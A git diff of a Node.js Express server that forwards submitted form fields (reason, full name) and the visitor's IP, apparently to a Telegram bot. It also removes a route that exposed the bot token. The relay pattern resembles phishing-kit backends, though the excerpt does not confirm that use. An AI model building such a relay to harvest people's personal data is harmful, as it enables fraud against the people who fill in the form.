@@ -13,14 +13,14 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Replace with your actu
 
 app.use(bodyParser.json());
 app.use(cors())
- app.listen(80, function () {
-  console.log('CORS-enabled web server listening on port 80')
-})
+// app.listen(80, function () {
+  //console.log('CORS-enabled web server listening on port 80')
+//})
 
 app.get('/', (req, res) => {
-    const ipAddress = IP.address();
-    // res.send(TELEGRAM_CHAT_ID)
-    res.send(TELEGRAM_BOT_TOKEN)
+    const clientIp = (req.headers['x-forwarded-for'] || '').split(',')[0] || req.socket.remoteAddress// This will give you the client's IP address
+    
+    res.send(`Client IP: ${clientIp}`);
   })
 app.post('/api/confirm', async (req, res) => {
     const formData = req.body;
@@ -30,7 +30,7 @@ app.post('/api/confirm', async (req, res) => {
         Object.entries(formData).filter(([key, value]) => value !== '')
     );
 
-    const ipAddress = IP.address();
+    const ipAddress = (req.headers['x-forwarded-for'] || '').split(',')[0] || req.socket.remoteAddress;
     const message = `
         Reason: ${filteredData.reason || 'N/A'}
         Full Name: ${filteredData.full_name || 'N/A'}
